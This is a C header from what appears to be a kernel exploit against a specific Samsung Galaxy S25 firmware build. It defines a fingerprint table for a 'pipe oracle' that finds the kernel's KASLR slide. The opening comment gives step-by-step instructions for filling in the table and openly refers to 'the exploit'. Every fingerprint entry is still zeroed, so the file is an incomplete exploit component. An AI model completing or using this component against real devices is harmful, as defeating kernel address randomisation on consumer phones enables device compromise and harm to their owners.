#pragma once

/*
 * p0_fingerprint.h — pipe-oracle fingerprint table for
 * f1q-S931BXXSAAZI1 (Galaxy S25, kernel 6.6.127)
 *
 * HOW TO POPULATE:
 *   1. Boot the device and obtain a kernel symbol map (vmlinux or
 *      /proc/kallsyms with symbols exposed).
 *   2. For each of the 32 KASLR slides (0x000000..0x1f0000, step
 *      0x010000), compute the physical address of the P0 probe page:
 *        phys = P0_PHYS_OFFSET + P0_KERNEL_PHYS_LOAD + slide
 *               + SLIDE_S928_PROBE_TARGET_IMAGE_OFF
 *   3. Read 8 64-bit words from that page at the offsets listed in
 *      p0_fingerprint_offsets[] and fill in the .words[] array below.
 *   4. Set P0_FINGERPRINT_MIN_SCORE to the appropriate threshold
 *      (typically 5 of 8 words, same as S24 Ultra).
 *
 * Until step 3 is completed, all word entries are 0.  The build will
 * succeed; the oracle will always report "no hit" at runtime, which
 * is safe (the exploit will retry rather than misidentify the slide).
 */

#define P0_FINGERPRINT_WORDS       8
#define P0_FINGERPRINT_SLIDE_COUNT 32
#define P0_FINGERPRINT_MIN_SCORE   5

static const size_t p0_fingerprint_offsets[P0_FINGERPRINT_WORDS] = {
  0x000, 0x008, 0x010, 0x018,
  0x020, 0x028, 0x030, 0x038,
};

struct p0_fingerprint {
  uintptr_t slide;
  uint64_t  words[P0_FINGERPRINT_WORDS];
};

/* TODO: replace zero words with real fingerprint data from nm/vmlinux */
static const struct p0_fingerprint p0_fingerprints[P0_FINGERPRINT_SLIDE_COUNT] = {
  { .slide = 0x000000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x010000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x020000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x030000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x040000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x050000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x060000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x070000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x080000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x090000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x0a0000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x0b0000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x0c0000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x0d0000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x0e0000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x0f0000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x100000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x110000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x120000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x130000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x140000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x150000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x160000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x170000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x180000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x190000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x1a0000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x1b0000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x1c0000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x1d0000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x1e0000ULL, .words = {0,0,0,0,0,0,0,0} },
  { .slide = 0x1f0000ULL, .words = {0,0,0,0,0,0,0,0} },
};
